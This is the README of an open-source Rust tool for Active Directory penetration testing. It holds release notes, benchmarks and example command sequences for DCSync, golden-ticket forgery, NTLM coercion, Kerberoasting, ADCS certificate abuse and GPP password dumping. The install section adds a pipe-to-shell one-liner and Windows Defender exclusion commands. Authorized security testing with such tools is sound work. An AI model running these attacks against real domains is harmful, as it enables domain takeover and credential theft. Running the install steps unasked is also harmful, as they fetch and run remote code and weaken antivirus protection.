<p align="center">
  <img src="docs/adhammer-logo.png" alt="ADHAMMER logo" width="360"/>
</p>

<p align="center">
  <img src="docs/adhammer-banner.png" alt="ADHAMMER — Active Directory security assessment" width="100%"/>
</p>

<h3 align="center">Open-source Rust · Active Directory pentest tool</h3>

<p align="center"><b>Collect the directory. Validate supported paths.</b></p>

<p align="center"><sub>One static binary. Evidence-first reporting. Published Rust protocol crates.</sub></p>

<p align="center">
  <a href="https://icedracon.github.io/adhammer/"><b>&nbsp;SITE&nbsp;</b></a>
  &nbsp;·&nbsp;
  <a href="https://crates.io/crates/adhammer"><b>&nbsp;INSTALL&nbsp;</b></a>
  &nbsp;·&nbsp;
  <a href="#-try-it-in-30-seconds"><b>&nbsp;DEMO&nbsp;</b></a>
  &nbsp;·&nbsp;
  <a href="docs/BENCHMARKS.md"><b>&nbsp;BENCHMARKS&nbsp;</b></a>
</p>

<p align="center">
  <a href="https://github.com/icedracon/adhammer/actions/workflows/ci.yml"><img src="https://github.com/icedracon/adhammer/actions/workflows/ci.yml/badge.svg" alt="CI"/></a>
  <a href="https://github.com/icedracon/adhammer/releases"><img src="https://img.shields.io/github/v/release/icedracon/adhammer?sort=semver&color=2ea8ff&style=flat-square" alt="Release"/></a>
  <a href="https://crates.io/crates/adhammer"><img src="https://img.shields.io/crates/v/adhammer.svg?color=2ea8ff&style=flat-square" alt="crates.io"/></a>
  <a href="https://github.com/icedracon/adhammer/stargazers"><img src="https://img.shields.io/github/stars/icedracon/adhammer?style=flat-square&color=2ea8ff" alt="stars"/></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-2ea8ff?style=flat-square" alt="License: MIT"/></a>
  <a href="https://icedracon.github.io/adhammer/"><img src="https://img.shields.io/badge/site-icedracon.github.io-05070d?style=flat-square&labelColor=2ea8ff" alt="Site"/></a>
</p>

<p align="center">
  <sub><b>validation ledger in <code>docs/VALIDATION.md</code></b> · <b>release notes in <code>CHANGELOG.md</code></b> · MIT</sub>
</p>

<br/>

## The idea

> **Evidence over assumption.** Collect the directory, trace the path, and validate supported findings with captured proof.

ADhammer collects the domain, graphs every control path that ends at Tier-0, then *proves* the interesting ones with the same protocol code the attacker would use. One continuous session from LDAP recon to a signed AS-REP on disk. Findings you can hand to a customer with the exact byte sequence that produced them.

<br/>

<p align="center">
  <img src="docs/demo.gif" alt="ADhammer live: audit → Zerologon safe-detect → DCSync krbtgt → golden ticket → pass-the-ticket to SYSTEM" width="88%"/>
</p>

<p align="center">
  <sub>The reference DA kill-chain demo, live against a hardened Server 2025 DC — under a minute on the lab environment.</sub>
</p>

<br/>

<p align="center">
  <img src="docs/tour.gif" alt="ADhammer 30-second capability tour — help, scan, posture, roast, ADCS" width="88%"/>
</p>

<p align="center">
  <sub>Or the 30-second capability tour — audit, posture, Kerberoast, ADCS rule pack.</sub>
</p>

<br/>

## 🎯 Detect ≠ Validate

Most AD security tools stop at *"potential attack path detected."*

ADhammer keeps going.

```text
Finding detected
      ↓
Attack path constructed
      ↓
Validation requested
      ↓
Live PoC executed
      ↓
Proof obtained
      ↓
Report generated
```

The difference matters:

| Not | But |
|:---:|:---:|
| *"potential path"* | ***"supported validation captured proof"*** |

Every finding in the report is either an audit observation, a supported validation with proof, or a path that still needs operator context. Defenders can see what was observed, what was proven, and what remains validation owed.

<br/>

## 🧭 The security-signal boundary

<p align="center">
  <img src="https://img.shields.io/badge/AD%20PENTEST-NATIVE%20SCOPE-2ea8ff?style=flat-square&labelColor=05070d" alt="AD pentest: native scope"/>
  <img src="https://img.shields.io/badge/SIEM-JSON%20OUTPUT-8b5cf6?style=flat-square&labelColor=05070d" alt="SIEM: JSON output"/>
  <img src="https://img.shields.io/badge/EDR%20%2F%20DLP-EXTERNAL%20CONTROLS-f7c948?style=flat-square&labelColor=05070d" alt="EDR and DLP: external controls"/>
  <img src="https://img.shields.io/badge/SIGMA%20%2F%20YARA-NOT%20SHIPPED-65758b?style=flat-square&labelColor=05070d" alt="Sigma and YARA: not shipped"/>
  <img src="https://img.shields.io/badge/WEB%20%2F%20APK-SEPARATE%20SCOPE-65758b?style=flat-square&labelColor=05070d" alt="Web and APK: separate scope"/>
</p>

> **ADhammer is an evidence-first Active Directory assessment tool — not an all-in-one security suite.** It produces assessment evidence for approved defender workflows; it does not replace a SIEM, EDR, DLP platform, rule engine, web scanner, or mobile / APK tester.

<table>
<tr>
<td width="26%" valign="top">

**◈ Active Directory pentest**<br/>
<sub>Native focus</sub>

</td>
<td valign="top">

Directory collection, documented AD web-surface fingerprinting, attack-path analysis, evidence-first reporting, and only the validation status recorded in the [validation ledger](docs/VALIDATION.md).

</td>
</tr>
<tr>
<td valign="top">

**◈ SIEM / case workflow**<br/>
<sub>Downstream JSON</sub>

</td>
<td valign="top">

Report JSON is machine-readable for downstream CI, SIEM, and scoring pipelines. ADhammer does not claim a built-in vendor connector or managed detection workflow.

</td>
</tr>
<tr>
<td valign="top">

**◈ EDR / DLP**<br/>
<sub>External controls</sub>

</td>
<td valign="top">

Authorized assessments can create observable protocol activity. ADhammer ships no EDR / DLP evasion, endpoint agent, or control-plane integration.

</td>
</tr>
<tr>
<td valign="top">

**◈ Sigma / YARA**<br/>
<sub>Not shipped</sub>

</td>
<td valign="top">

No Sigma / YARA rule pack or rule engine is bundled. Detection content belongs in the team’s own approved detection-engineering workflow.

</td>
</tr>
<tr>
<td valign="top">

**◈ Web / APK pentest**<br/>
<sub>Separate discipline</sub>

</td>
<td valign="top">

ADhammer is not a general web-application or Android / APK testing framework. Use purpose-built, separately authorized tools for those assessments.

</td>
</tr>
</table>

<p align="center">
  <code>ADhammer assessment</code> &nbsp;→&nbsp; <code>evidence-rich JSON report</code> &nbsp;→&nbsp; <code>your approved detection / case workflow</code>
</p>

<br/>

## Release Truth

The current public release is **1.5.0** (published 2026-09-04).

[GitHub Releases](https://github.com/icedracon/adhammer/releases/tag/v1.5.0) and
[crates.io](https://crates.io/crates/adhammer) both offer 1.5.0. GitHub
release builds include SHA-256 sidecars and GitHub OIDC Sigstore attestation
verification instructions.

Public claims for ADhammer should follow three rules:

- **Release-specific changes live in [CHANGELOG.md](CHANGELOG.md).**
- **Validation status lives in [docs/VALIDATION.md](docs/VALIDATION.md).**
- **No public copy should claim more than the validation ledger supports.**

That keeps the README useful across release lines without turning the first screen into a moving archive.

### 1.5.0 highlights

**No-credential black-box assessment capability.** Turns adhammer from
an authenticated audit tool into a first-touch engagement tool that
can characterise a domain from zero credentials. The new `adhammer run`
verb chains: hand-rolled RFC 1035 DNS resolver → per-DC HTTP surface
fingerprint (`--web`: ADCS ESC8 relay tell `/certsrv/`, RD Web, ADFS
sign-in + FederationMetadata, OWA/EWS, Autodiscover, SCCM) → per-DC
anonymous SMB posture in one null session (`--deep`: SAMR users +
srvsvc sessions + srvsvc `NetrShareEnum` level 1 + wkssvc + lsarpc
`LsarOpenPolicy`, all in a single-shot enum4linux-ng-shape matrix).
Standalone verbs: `enum web`, `enum nullbind`, `enum rpc-null`,
`enum shares --anon`, `enum host --anon`, `enum sysvol` (anon + auth
GPP `cpassword` walk over SMB2 `QUERY_DIRECTORY`, decrypted with the
public MS14-025 AES key; recovered plaintext lands only in a 0600
`write_secret_artifact`). New `attack coerce --scan-all` runs every
coercion vector (PrinterBug / PetitPotam ×2 pipes / DFSCoerce /
ShadowyCoerce) over one authenticated login and prints a which-fired
matrix. Every hash `attack roast` emits carries a companion
`[hashglass] -m <mode> "<name>" conf=<c>` line on stderr (stdout stays
hashcat-pipe-clean). Sibling protocol crates advance: smb2-client
0.2.1→0.2.3 (`login_null` + `list_directory` + non-deleting
`read_file` + share-root open fix, all bounds- and loop-bounded
against hostile input), dcerpc 0.2.8→0.2.9 (srvsvc `NetrShareEnum`
opnum 15 with the same allocation-bound discipline as the existing
`NetSessionEnum`). Full detail in [CHANGELOG.md](CHANGELOG.md),
[docs/PLAN_1.5.0.md](docs/PLAN_1.5.0.md), and
[docs/PLAN_1.5.0_READINESS.md](docs/PLAN_1.5.0_READINESS.md).

### 1.4.10 highlights

**Hardening patch — bug-fix / defence-in-depth only, no new capability.** Closes eight
behavioural findings from the 2026-09-02 audit against the 1.4.9 tree.
`crates/collector` now refuses an authenticated `simple_bind` over plaintext `ldap://`
unless the operator explicitly opts in (BF-1); LDAP paged-search and SYSVOL-walk both
enforce hostile-server DoS-defence budgets (BF-7). `crates/sysvol::decrypt_cpassword`
returns `SecretString` and the GPP `Finding` no longer embeds recovered plaintext into
the report body (BF-2); a new `adhammer_core::write_secret_artifact` helper writes
recovered credentials to a 0600 file on request. Every string a report renderer sees is
scrubbed of terminal control sequences via `adhammer_core::sanitize_terminal_output`
(BF-8). The runner types (`EngagementScope`, `BlackBoxRunner`) land as a patch-safe
additive foundation; the observable no-cred assessment capability they support is
1.5.0 scope. Live-DC receipts against Server 2019 / 2022 / 2025 landed under
`docs/receipts/1.4.10__*.md` with the receipt scrubber hardened for UTF-8 stdout and
context-aware short-hex-key redaction. Full detail in [CHANGELOG.md](CHANGELOG.md) and
[docs/PLAN_1.4.10.md](docs/PLAN_1.4.10.md).

### 1.4.9 highlights

**Release-integrity and validation hardening.** The default dependency graph now excludes the
offline-only MSSQL client and pre-alpha direct GKDI adapter; optional paths are feature-gated,
valid TLS configurations are CI-checked independently, and every published crate declares the
Rust 1.88 MSRV. Rustls installs one process-wide AWS-LC provider before any TLS builder runs.
The live-validation harness accepts credential references only, sanitizes target-controlled
output before publishing atomic receipts, and binds receipts to the tested binary hash. Capability
claims remain governed by [the validation ledger](docs/VALIDATION.md); missing live receipts are
validation debt, not implied support.

### 1.4.8 highlights

**Capability-expansion release.** 18 of 19 planned offensive vectors are implemented on `main`; validation status varies by capability and [the validation ledger](docs/VALIDATION.md) is authoritative. Seven vectors are net-new implementations this cycle: **WS-KERBRUTE** (Kerberos user enumeration via pre-auth-less AS-REQ, RFC 4120 §7.5.9), **WS-DIAMOND-TICKET** (Golden variant that inherits real KDC timestamps and drops the 10-year-validity IOC), **WS-SID-HISTORY-INJECT** (canonical cross-forest injection), **WS-ESC1-EXPLOIT** (6-stage checklist with KB5014754 handling), **WS-ESC3-CHAIN** (per-variant Enrollment Agent chain), **WS-UNPAC-PKINIT** (PKINIT-then-extract-NT-hash from `PAC_CREDENTIAL_INFO`, MS-PAC §2.6), and **WS-DPAPI-MASTER-KEY** (offline classic-DPAPI masterkey decryption — the 64-byte AES256 key that unlocks every `CryptProtectData` blob a SID owns; live-validated on Server 2025 vs impacket byte-for-byte, backed by the sibling `dpapi-offline 0.1.2` crate which this cycle fixed to route through Windows's non-standard PBKDF2 variant instead of RFC 8018 (0.1.1 was yanked mid-release after a KAT-material privacy audit; 0.1.2 rebuilds the KAT from synthetic throwaway inputs and is what ADhammer 1.4.8 depends on)). Eleven additional vectors — lateral-movement (`psexec`/`wmiexec`/`atexec`/`evil-winrm`), local secretsdump (SAM + LSA + DCC2), NTLM relay chain (`coerce` → `poison` → `relay` → LDAP/CA/ICPR), ESC8, and DRSUAPI-path DCShadow — were already implemented in the tree and are now doc-named to the plan. **WS-WMIEXEC moved from `[SEALED-BLOCKED]` to LIVE** after this pass verified `dcerpc::dcom_wmi::wmi_exec` works without the cut WS-4-P2 sealed-RPC path. One vector deferred to 1.4.9 with explicit rationale in `docs/PLAN_1.4.8.md`: WS-NTDS-OFFLINE (blocked on sibling `ese-parser` shipping v0.2). One vector permanently dropped from plan (down from 20): WS-SKELETON-KEY (persistence value strictly duplicated by WS-GOLDEN-TICKET, worse AV surface, per-Windows-version binary shim). Zero new third-party deps in ADhammer; one sibling crate published (`dpapi-offline 0.1.2`, the DPAPI enabler + privacy-clean replacement for the yanked 0.1.1). Sibling `ldap3` / `rustls` / `tokio-rustls` / `rustls-native-certs` / `rustls-pemfile` / `time` were updated; `cargo audit` passes with the documented RSA timing-advisory exception. Full detail in [CHANGELOG.md](CHANGELOG.md).

<br/>

## 👥 Who is this for?

<table>
<tr>
<td width="33%" valign="top">

**🔴 Red team operators**

One binary, no Python runtime, no sidecar services. Works from Kali or straight off a Windows jump box. Supported validation paths are exercised in an authorized lab and tracked in the validation ledger instead of being overstated in marketing copy.

</td>
<td width="33%" valign="top">

**🛡️ AD auditors / defenders**

50+ hygiene checks across four categories, MITRE ATT&CK-tagged, low-priv collection via `SD_FLAGS`. Reports as JSON, HTML, or a BloodHound-CE ingest bundle. Supported findings have matching PoCs; unsupported ones stay labeled potential instead of being overstated.

</td>
<td width="33%" valign="top">

**🦀 Rust developers**

Published icedracon protocol crates on crates.io, each `cargo add`-able. Compose your own DCE/RPC stack, forge PACs, decrypt LAPS blobs, or emit BloodHound JSON — pick the layer that fits, skip the rest. See the **[ecosystem section](#-built-on-a-from-scratch-rust-ecosystem)**.

</td>
</tr>
</table>

<br/>

<p align="center">
  <a href="https://github.com/icedracon/adhammer/stargazers">⭐ Star the repo</a> &nbsp;·&nbsp;
  <a href="https://crates.io/crates/adhammer">📦 <code>cargo install adhammer</code></a> &nbsp;·&nbsp;
  <a href="https://dev.to/pumadracon/i-built-a-full-active-directory-pentest-audit-tool-in-rust-on-a-protocol-stack-i-wrote-from-fl5">📖 Read the write-up</a>
</p>

<br/>

## 🚀 Try it in 30 seconds

```sh
cargo install --locked adhammer

adhammer scan  --url ldaps://dc.corp.local:636 \
               --user 'CORP\svc' --password ... \
               --insecure --bloodhound out.zip
```

Fast per-operation timings (see [BENCHMARKS.md](docs/BENCHMARKS.md) for the recorded matrix), JSON + HTML report, BloodHound-compatible graph bundle — from a low-privileged domain user account. See the [full command list](#usage) below or grab prebuilt binaries (musl / glibc / macOS / Windows) from **[Releases](https://github.com/icedracon/adhammer/releases)**.

<br/>

> [!CAUTION]
> **Authorized use only.** ADhammer implements working offensive techniques — DCSync, golden / silver / diamond tickets, pass-the-ticket, NTLM relay, ADCS abuse, remote code execution. Use only against systems you own or are explicitly authorized to test. See [SECURITY.md](SECURITY.md).

<br/>

<p align="center">
  <img src="docs/stats-banner.svg" alt="ADhammer at a glance" width="100%"/>
</p>

<br/>

<p align="center">
  <img src="docs/comparison.svg" alt="ADhammer operator map — collect, graph, validate supported findings, report" width="100%"/>
</p>

<br/>

<img src="docs/divider.svg" width="100%" alt=""/>

<br/>

<img src="docs/section-how.svg" width="100%" alt="How it works"/>

<br/>

**One product philosophy: detect the path, then prove it.**

```text
                     ADHAMMER
                        │
                        ▼
    ┌─────────────────────────────────────────┐
    │                 AUDIT                   │
    │   LDAP + SD_FLAGS  →  Snapshot          │
    │   50+ hygiene checks + 15/16 ADCS ESC   │
    └─────────────────────┬───────────────────┘
                          ▼
    ┌─────────────────────────────────────────┐
    │                 GRAPH                   │
    │   petgraph control-path graph           │
    │   cheapest chain to Tier-0 (Dijkstra)   │
    └─────────────────────┬───────────────────┘
                          ▼
    ┌─────────────────────────────────────────┐
    │              VALIDATE                   │
    │   Live PoC per finding — real hash,     │
    │   real cert, real replicated secret     │
    └─────────────────────┬───────────────────┘
                          ▼
    ┌─────────────────────────────────────────┐
    │               REPORT                    │
    │   JSON · HTML · BloodHound-CE bundle    │
    │   MITRE ATT&CK per finding + evidence   │
    └─────────────────────────────────────────┘
```

Two commands drive the whole flow. Everything else is a subcommand.

### 1 &mdash; `adhammer scan` &nbsp;·&nbsp; audit a domain

Collects a domain over LDAP as a **low-privileged user** (via the `SD_FLAGS` control), builds a control-path graph in-process, and runs the check pack across four categories — privileged accounts, trusts, stale objects, anomalies — plus **15 of the 16 AD CS ESC classes**, ADIDNS exposure, and SYSVOL / GPP. Every finding is scored, MITRE-tagged, and exportable in a BloodHound-compatible JSON bundle.

### 2 &mdash; `adhammer auto` &nbsp;·&nbsp; validate supported findings with a live PoC

A report shouldn't say a path *might* be exploitable when the tool can prove it. `auto` walks each finding, asks "*validate this one?*" — on yes runs the matching supported tradecraft, marks the finding **validated only when real proof is present** (an actual `$krb5tgs$` hash, a replicated `krbtgt` secret, an `ISSUED` cert), and leaves unsupported findings explicitly marked as potential. Everything lands in a Markdown assessment report with the exact command + evidence per PoC.

<br/>

<p align="center">
  <img src="docs/vulns.gif" alt="ADhammer guided output — severity-coded findings validated with live PoCs" width="88%"/>
</p>

<p align="center">
  <sub><i>Guided <code>auto</code> output — severity-coded findings, each optionally confirmed with a live PoC.</i></sub>
</p>

<br/>

<img src="docs/divider.svg" width="100%" alt=""/>

<br/>

<img src="docs/section-benchmark.svg" width="100%" alt="Performance"/>

<br/>

## ⚡ Performance

Every operation on a warm cache against a fully-patched **Windows Server 2025** domain controller, cold-timed at the command boundary. Compiled Rust binary — cold-start under a second, most operations under **100 ms**.

| Operation | Median |
|:---|---:|
| Zerologon safe-detect | **54 ms** |
| RBCD write (`msDS-AllowedToActOnBehalfOfOtherIdentity`) | **49 ms** |
| BadSuccessor (Server 2025 dMSA succession) | **48 ms** |
| LDAP query (name → SID) | **59 ms** |
| SAMR user enumeration | **63 ms** |
| AD CS enterprise CA enumeration | **67 ms** |
| DCSync `krbtgt` secret | **73 ms** |
| RRP secretsdump (SAM + SECURITY + SYSTEM) | **74 ms** |
| Kerberoast one SPN | **79 ms** |
| AS-REP roast one account | **80 ms** |
| Full LDAP audit + control-path graph (500-object domain) | **88 ms** |
| AD CS ESC1 enrollment end-to-end (submit → issued PEM) | **315 ms** |

Reproduce in one command — driver ([`bench/run_bench.sh`](bench/run_bench.sh)) · renderer ([`bench/render_results.py`](bench/render_results.py)) · TSV output ([`bench/results.tsv`](bench/results.tsv)) · methodology ([`docs/BENCHMARKS.md`](docs/BENCHMARKS.md)).

<br/>

<img src="docs/divider.svg" width="100%" alt=""/>

<br/>

## 📥 Install

<table>
<tr>
<td width="50%">

**From crates.io** — currently 1.4.10 (the 1.5.0 crates.io publish is a
separate maintainer-authorized action; while 1.5.0 lives only as a
local candidate this remains the installable version on the registry):

```sh
cargo install --locked adhammer
```

For a specific release directly from its immutable Git tag (substitute
`v1.4.10` with the tag you want; `v1.5.0` becomes valid once the
maintainer creates and pushes that tag):

```sh
cargo install --locked --git https://github.com/icedracon/adhammer --tag v1.4.10 adhammer
```

The default build contains the audited scan/report pipeline and live-validated capabilities.
The offline-tested MSSQL client is an explicit opt-in:

```sh
cargo install --locked adhammer --features mssql
```

The collector-only `experimental-gkdi` feature exposes the pre-alpha `ms-gkdi` adapter for KAT
development (`cargo build -p adhammer-collector --features experimental-gkdi`); it is intentionally
absent from default binaries. The live-validated Windows LAPS command continues to use `dpapi-ng`
and is unaffected by that adapter feature.

LDAPS uses `tls-rustls` by default. For legacy SHA-1 DC certificates, build with
`--no-default-features --features tls-native`; with neither TLS feature, only plain `ldap://` is
available. `tls-rustls` and `tls-native` are mutually exclusive, so `--all-features` is not a valid
configuration; CI checks each supported feature combination separately.

> **Windows one-liner (1.4.8+)** — wraps the Defender exclusion dance around
> the install. Run in an elevated PowerShell:
>
> ```powershell
> iwr https://raw.githubusercontent.com/icedracon/adhammer/main/docs/install.ps1 | iex
> ```
>
> The script adds a temporary Defender exclusion for `%USERPROFILE%\.cargo`,
> runs `cargo binstall adhammer` (falls back to `cargo install` if
> `cargo-binstall` isn't present), removes the exclusion, prints the
> installed version. Idempotent. See [`docs/install.ps1`](docs/install.ps1)
> for the source.
>
> **Manual path (why the script exists).** Windows Defender heuristically
> quarantines the compiled `adhammer.exe` during `cargo install`, failing
> with `Operation did not complete successfully because the file contains a
> virus or potentially unwanted software. (os error 225)` — the compile
> itself is fine; Defender flags the final copy from the install temp dir
> to `~/.cargo/bin/`. Manual install (elevated PowerShell, one-time):
>
> ```powershell
> Add-MpPreference -ExclusionPath "$env:USERPROFILE\.cargo\bin"
> Add-MpPreference -ExclusionPath "$env:USERPROFILE\.cargo\registry"
> Add-MpPreference -ExclusionProcess "adhammer.exe"
> cargo install --locked adhammer
> ```

**As a library** — every module importable:

```sh
cargo add adhammer-sdk
```

</td>
<td width="50%">

**Prebuilt binaries** per release:

- musl (static, no glibc)
- glibc (Linux)
- macOS arm64 (Apple Silicon)
- macOS x64 (Intel)
- Windows (x64)

Grab the latest from **[Releases →](https://github.com/icedracon/adhammer/releases)**

</td>
</tr>
</table>

Requires **Rust 1.88+** to build from source (bumped in 1.4.8 to pull the `time 0.3.47` DoS fix, RUSTSEC-2026-0009). Tested on Kali, Ubuntu, Debian, macOS, and native Windows.

<br/>

<img src="docs/divider.svg" width="100%" alt=""/>

<br/>

## 🎯 Usage

Run `adhammer` with **no arguments** for the **guided interactive menu** — asks for user → password (or NT hash) → domain → DC, saves the session, walks every action with prompts. For golden / silver / pass-the-ticket it auto-fetches the krbtgt / service AES256 key (via DCSync) and the domain SID (via LSAT). Add `--no-save` to keep credentials off disk.

<p align="center">
  <img src="docs/interactive.gif" alt="ADhammer setup wizard and guided menu" width="88%"/>
</p>

<br/>

### Session hunting — three complementary primitives

`enum sessions` (SRVSVC), `enum wkssvc` (WKSSVC), and `enum hku` (HKU registry walk) each answer the *who is on this box* question from a different angle — different auth requirements, different result granularity. Dedup + machine-account filtering are on by default (`--include-machine` shows the count marker for what was hidden).

<p align="center">
  <img src="docs/sessions.gif" alt="ADhammer session hunting — SRVSVC, WKSSVC, HKU, and --json envelope" width="88%"/>
</p>

<p align="center">
  <sub>SRVSVC + WKSSVC + HKU registry — one target, three angles. <code>--json</code> pipes cleanly into <code>jq</code>.</sub>
</p>

<br/>

**Power-user subcommands (full 1.5.0 surface):**

```
run    [--web] [--deep]                     no-cred black-box: DNS SRV -> web fingerprint -> anon SMB posture
scan                                        passive audit -> JSON/HTML (+ --sysvol, --bloodhound out.zip)
auto                                         guided: scan -> confirm each weakness -> validate + PoC report
enum   {samr, lsa, net, dns, adcs, esc, posture, sessions, wkssvc, hku, sccm, scom, krb-users,
        web, nullbind, rpc-null, shares, host, sysvol}
                                            new in 1.5.0: web + nullbind + rpc-null + shares --anon +
                                            host --anon + sysvol (--anon | --user); everything anon-shape
                                            runs over one login_null SMB session
attack {roast (hashglass-annotated), spray, abuse, coerce (--scan-all matrix), rbcd, constrained,
        unconstrained, dcsync, exec, atexec, wmiexec, secretsdump, gmsa, laps, esc1, esc4, icpr-esc1,
        golden, silver, diamond, pth, asktgt, winrm, capture, poison, relay, zerologon, shadowcred,
        dcshadow, badsuccessor, mssql, dns, unpac}
```

### Attack surface — by credential requirement

Every verb below is honest about what it needs. The 1.5.0 no-cred tier is
the black-box first-touch capability push; the higher tiers already
existed in 1.4.x and are unchanged.

| Tier | Requires | Verbs (highlights) | What it reveals / does |
|:---|:---|:---|:---|
| **0 · No creds** | just an in-scope IP or realm | `run` (+ `--web`, `--deep`), `enum web` / `nullbind` / `rpc-null` / `shares --anon` / `host --anon` / `sysvol --anon` / `krb-users` | AD DC/KDC/GC via DNS SRV; ADCS ESC8 relay surface (`/certsrv`), RD Web, ADFS, OWA/EWS, SCCM; anon SAMR users, anon srvsvc sessions + shares, anon lsarpc policy; anon GPP `cpassword` (MS14-025) walk over SYSVOL; Kerberos user enum via KDC error codes; AS-REP-roastable users flagged for `attack roast` |
| **1 · Low-priv (any domain user)** | valid domain cred | `scan`, `enum sessions/wkssvc/hku/dns/adcs/esc/posture/samr/lsa/net/sccm/scom`, `enum sysvol --user X`, `attack roast`, `attack spray`, `attack abuse`, `attack coerce` (+ `--scan-all`) | 58-check LDAP audit + BloodHound-CE export; session hunting from 3 angles; Kerberoast + AS-REP roast (each hash annotated on stderr with its hashcat mode via hashglass); ACL-abuse chains; NTLM coercion 5-vector matrix (PrinterBug / PetitPotam ×2 pipes / DFSCoerce / ShadowyCoerce) |
| **2 · Admin on target** | local admin or DA | `attack dcsync`, `attack secretsdump`, `attack exec/atexec/wmiexec/winrm`, `attack rbcd/constrained/unconstrained`, `attack shadowcred`, `attack esc1/esc4/icpr-esc1`, `attack laps`, `attack gmsa`, `attack mssql`, `attack dns`, `attack zerologon` (safe-detect), `attack badsuccessor` | remote SAM / LSA / NTDS extract; lateral exec over 4 protocols; delegation abuse (S4U2Self+Proxy); ADCS ESC1/4/6/8/11/15 enrollment via MS-ICPR; LAPS + gMSA password dump; MSSQL over TDS 7.4; Server 2025 dMSA succession (BadSuccessor) |
| **3 · Crypto material** | krbtgt / TGT / NT hash from tier 2 | `attack golden`, `attack silver`, `attack diamond`, `attack pth`, `attack asktgt`, `attack unpac`, `attack dcshadow` | ticket forgery (golden / silver / diamond); pass-the-hash → session; TGT / TGS request from KDC directly; UnPAC-the-hash; DCShadow persistence (LDAP-path variant dead on 2019+ per [`project-dcshadow-ldap-dead-on-2019plus`](https://github.com/icedracon/adhammer)) |

<details>
<summary><b>💡 Engagement flow examples (real command sequences)</b></summary>
<br/>

**First-touch, zero credentials (new in 1.5.0):**

```sh
# Discover DCs by DNS + fingerprint web surface + anon SMB posture per DC, in one shot:
adhammer run --domain corp.local --range 10.0.0.0/24 --dns-server 10.0.0.1 --web --deep

# Standalone: unified anon posture on one host (enum4linux-ng shape):
adhammer enum host --anon --host 10.0.0.10

# Anon SYSVOL walk for GPP cpassword — MS14-025 instant creds from zero creds:
adhammer enum sysvol --anon --host 10.0.0.10 --dump gpp_creds.txt

# ADCS ESC8 relay-surface fingerprint (checks /certsrv, RD Web, ADFS, OWA/EWS, SCCM):
adhammer enum web --host 10.0.0.10

# Kerberos user enum via pre-auth-less AS-REQ (no LDAP creds needed):
adhammer enum krb-users --host dc.corp.local --realm CORP.LOCAL --users users.txt
```

**Low-priv domain user (tier 1):**

```sh
# Audit a domain, export a BloodHound bundle:
adhammer scan --url ldaps://dc.corp.local:636 --user 'CORP\svc' --password @file:pw --insecure \
              --bloodhound out.zip

# ADIDNS + AD CS recon:
adhammer enum dns  --url ldaps://dc:636 --user 'CORP\svc' --password @file:pw --insecure
adhammer enum adcs --url ldaps://dc:636 --user 'CORP\svc' --password @file:pw --insecure

# Session hunting from 3 angles (SRVSVC / WKSSVC / HKU registry):
adhammer enum sessions --host dc --domain CORP --user svc --password env:PW
adhammer enum wkssvc   --host dc --domain CORP --user svc --password env:PW
adhammer enum hku      --host dc --domain CORP --user svc --password env:PW

# Authenticated SYSVOL walk (any domain user can read SYSVOL):
adhammer enum sysvol --host dc --domain CORP --user svc --password env:PW --dump gpp_creds.txt

# Kerberoast + AS-REP roast; every emitted hash carries [hashglass] -m <mode> on stderr:
adhammer attack roast --url ldaps://dc:636 --user 'CORP\svc' --password env:PW --kdc dc \
              > hashes.txt 2> hashglass_annotations.txt
hashcat -m 13100 hashes.txt wordlist.txt   # mode straight from the annotation

# Coercion — try every vector over one login, print a which-fired matrix:
adhammer attack coerce --scan-all --host dc.corp.local --domain CORP --user svc \
              --password env:PW --listener 10.99.99.99
```

**Admin on target (tier 2) + crypto material (tier 3):**

```sh
# DCSync the krbtgt key, forge a golden ticket, pass-the-ticket to SYSTEM:
adhammer attack dcsync --host dc --domain CORP --user Administrator --password env:PW --target krbtgt
adhammer attack pth    --host dc --realm CORP.LOCAL --krbtgt-aes256 <64-hex> --domain-sid S-1-5-21-... \
                       --spn cifs/dc.corp.local --command whoami

# AD CS ESC1 / ESC3 / ESC6 / ESC15 enrollment via MS-ICPR:
adhammer attack icpr-esc1 --ca CORP-CA --template User --target-upn administrator@corp.local \
                        --host dc --domain CORP --user 'CORP\svc' --password env:PW \
                        --esc esc6 --san-upn administrator@corp.local

# Server 2025 dMSA succession (BadSuccessor):
adhammer attack badsuccessor --dmsa-name pwn --target <victim>
```

</details>

### Reading the output — exposed vs refused = both are findings

Every no-cred `enum` verb reports the DC's posture symmetrically:

- **exposed:** `[ANON EXPOSED]` marker + the actual enumerated data.
  Actionable — the DC permits anonymous access to a surface that should
  be restricted (`RestrictAnonymous=1`, `RestrictNullSessAccess=1`,
  disable `SYSVOL` anon read).
- **refused:** the verb reports the exact NTSTATUS / RPC fault
  (`0xc000006d` null session refused, `0xc0000022` access denied,
  `BIND_NAK reason=8`, etc.) as a **hardened-posture finding**, not an
  error. The refused pattern is diagnostic — e.g. Server 2025 DC01
  blocks anon SAMR (`0xc0000022`) but exposes srvsvc/wkssvc/lsarpc =
  selective hardening, worth noting in the report.

Same shape for `attack coerce --scan-all`: every vector's outcome is
recorded — accepted (fired) or the exact wire refusal (RPC timeout /
`STATUS_OBJECT_NAME_NOT_FOUND` / BIND context reject / BIND_NAK) —
so the operator sees exactly what's hardened and what isn't.

<br/>

<img src="docs/divider.svg" width="100%" alt=""/>

<br/>

<img src="docs/section-coverage.svg" width="100%" alt="Coverage"/>

<br/>

## 📋 Coverage

### Audit checks — 4 categories, 15/16 AD CS ESC classes

| Category | Coverage |
|:---------|:---------|
| **Privileged accounts** | AS-REP / Kerberoast exposure · unconstrained delegation · DCSync control paths (graph) · sensitive-group membership · gMSA read ACL · SID history · RBCD · LAPS coverage · `PASSWD_NOTREQD` |
| **Trusts** | SID filtering · selective auth · cross-forest TGT delegation · RC4 downgrade · transitivity |
| **Stale objects** | Inactive users / computers · old passwords · EOL OS · duplicate SPNs · stale machine passwords |
| **Anomalies** | `MachineAccountQuota` · krbtgt age · RC4 Kerberos · reversible encryption · BadSuccessor (dMSA) · password policy · anonymous LDAP · Pre-Windows 2000 · Guest · GPP `cpassword` (MS14-025) · LM / NTLMv1 · LDAP / SMB signing |
| **AD CS (15/16 ESC)** | Passive: ESC1-5, 9, 13-15 / EKUwu (CVE-2024-49019) · Active: ESC1, ESC3, ESC6, ESC8, ESC15 · Registry: ESC6-7, 10-11, 16 · Only ESC12 (hardware token) out of scope |
| **ADIDNS** | Zone + record enumeration with wildcard (mitm6 / WPAD) exposure detection |

Every finding carries a **MITRE ATT&CK** technique (T1558.003, T1003.006, T1649, T1484, …).

<br/>

<details>
<summary><b>🔍 Recon / export</b></summary>
<br/>

- LDAP audit (paged, `SD_FLAGS`-scoped) → JSON / HTML report
